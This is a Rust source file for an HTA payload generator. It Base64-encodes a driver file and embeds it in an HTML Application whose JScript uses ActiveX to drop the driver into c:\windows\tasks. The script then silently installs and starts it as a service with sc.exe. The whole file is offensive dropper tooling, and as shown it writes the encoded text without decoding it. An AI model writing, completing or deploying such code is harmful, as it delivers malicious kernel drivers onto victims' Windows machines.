use base64::Engine;
use tracing::{info, debug};
use crate::utils::{read_file_to_vec, write_file};

pub struct HtaGenerator {
    output_file: String,
    driver_file: String,
}

impl HtaGenerator {
    pub fn new(output_file: &str, driver_file: &str) -> Self {
        Self {
            output_file: output_file.to_string(),
            driver_file: driver_file.to_string(),
        }
    }

    fn read_driver_file(&self) -> std::io::Result<Vec<u8>> {
        debug!("[*] Reading driver file: {}", self.driver_file);
        read_file_to_vec(&self.driver_file)
    }

    fn encode_driver(&self, driver_data: &[u8]) -> String {
        debug!("[*] Encoding driver data to Base64");
        let engine = base64::engine::general_purpose::STANDARD;
        engine.encode(driver_data)
    }

    fn generate_hta_content(&self, encoded_driver: &str) -> String {
        const HTA_TEMPLATE: &str = r#"
        <html>
        <head>
            <title>HTA Generator</title>
            <HTA:APPLICATION ID="oHTA"
                APPLICATIONNAME="HTA Generator"
                BORDER="thin"
                CAPTION="yes"
                SHOWINTASKBAR="yes"
                SINGLEINSTANCE="yes"
                SYSMENU="yes"
                VERSION="1.0"/>
            <script language="JScript">
            <![CDATA[
            function runDriver() {
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var shell = new ActiveXObject("WScript.Shell");
                var driverPath = "c:\\windows\\tasks\\" + (Math.random() + 1).toString(36).substring(7) + ".sys";
                var driverData = "{DRIVER_DATA}";

                var file = fso.CreateTextFile(driverPath, true);
                file.Write(driverData);
                file.Close();

                shell.Run("sc.exe create MyDriver binPath= \"" + driverPath + "\"", 0, true);
                shell.Run("sc.exe start MyDriver", 0, true);
            }
            ]]>
            </script>
        </head>
        <body>
            <button onclick="runDriver()">Run Driver</button>
        </body>
        </html>
        "#;

        HTA_TEMPLATE.replace("{DRIVER_DATA}", encoded_driver)
    }

    fn write_hta_file(&self, content: &str) -> std::io::Result<()> {
        debug!("[*] Writing HTA content to: {}", self.output_file);
        write_file(&self.output_file, content.as_bytes())
    }

    pub fn generate(&self) -> std::io::Result<()> {
        info!("[+] Starting HTA generation process");
        let driver_data = self.read_driver_file()?;
        let encoded_driver = self.encode_driver(&driver_data);
        let hta_content = self.generate_hta_content(&encoded_driver);
        self.write_hta_file(&hta_content)?;
        info!("[+] HTA file generation complete");
        Ok(())
    }
}
